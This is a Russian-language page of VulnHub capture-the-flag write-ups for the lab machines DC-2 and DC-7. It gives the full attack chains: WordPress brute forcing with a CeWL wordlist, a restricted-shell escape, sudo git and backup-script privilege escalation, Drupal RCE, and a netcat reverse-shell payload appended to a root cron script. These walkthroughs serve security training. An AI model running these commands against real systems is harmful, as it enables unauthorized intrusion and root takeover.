Write-ups — VulnHub

Разборы уязвимых машин VulnHub: от сканирования до получения root. Каждый write-up включает цепочку эксплуатации, использованные инструменты и разбор причин уязвимостей.

МашинаСложностьВектор входаPrivilege EscalationКлючевые техникиDC-2BeginnerWordPress + брутфорс (Cewl-словарь)sudo git help config → GTFOBinWPScan, Cewl, обход rbash через vi, GTFOBinsDC-7BeginnerУтечка credentials на GitHubSudo-misconfiguration (backup.sh)OSINT, Drupal drush, RCE через PHP filter module


DC-2

Стек: WordPress, SSH (нестандартный порт 7744)

Цепочка атаки:


nmap -sV -p- → порты 80 (HTTP), 7744 (SSH)
WPScan → enumeration пользователей: admin, jerry, tom
Cewl → генерация словаря паролей из контента сайта
Брутфорс WPScan по словарю → пароли для jerry и tom
SSH под tom → ограниченный shell (rbash) → обход через vi (:set shell=/bin/bash → :shell)
sudo -l → доступен git help config без пароля → побег в root shell через !/bin/bash (GTFOBins)


bashnmap -sV -p- 192.168.0.113
cewl http://dc-2 -w pass.txt
wpscan --url http://dc-2 -U users.txt -P pass.txt
ssh tom@192.168.0.113 -p 7744
sudo git help config
# внутри pager: !/bin/bash

Причина уязвимости: избыточные sudo-права на git без ограничения субкоманд + слабые пароли, восстановимые по контенту сайта.


DC-7

Стек: Drupal, Apache 2.4.25, SSH

Цепочка атаки:


nmap -sC -sV → порты 22 (SSH), 80 (HTTP)
nikto + анализ сайта → footer с подсказкой DC7USER
OSINT / Google dorking → GitHub-репозиторий dc7user/staffdb
В config.php репозитория — открытые учётные данные → SSH-доступ
drush user-password admin --password=... → сброс пароля админа Drupal без веб-аутентификации
Установка модуля PHP filter через админку → RCE через страницу с PHP-кодом → reverse shell (www-data)
sudo -l → www-data может изменять /opt/scripts/backup.sh без пароля → инъекция reverse-shell payload (msfvenom cmd/unix/reverse_netcat) → выполнение по cron → root


bashnmap -sC -sV 10.0.2.3
ssh dc7user@10.0.2.3
drush user-password admin --password=123456
msfvenom -p cmd/unix/reverse_netcat lhost=10.0.2.15 lport=8889 R
echo "mkfifo /tmp/trsgux; nc 10.0.2.15 8889 0</tmp/trsgux | /bin/sh >/tmp/trsgux 2>&1; rm /tmp/trsgux" >> /opt/scripts/backup.sh

Причина уязвимости: утечка credentials в публичном репозитории + избыточные sudo-права на скрипт, исполняемый от root.


Инструменты, встречающиеся в разборах

nmap · nikto · gobuster · wpscan · cewl · drush · msfvenom · netcat · GTFOBins
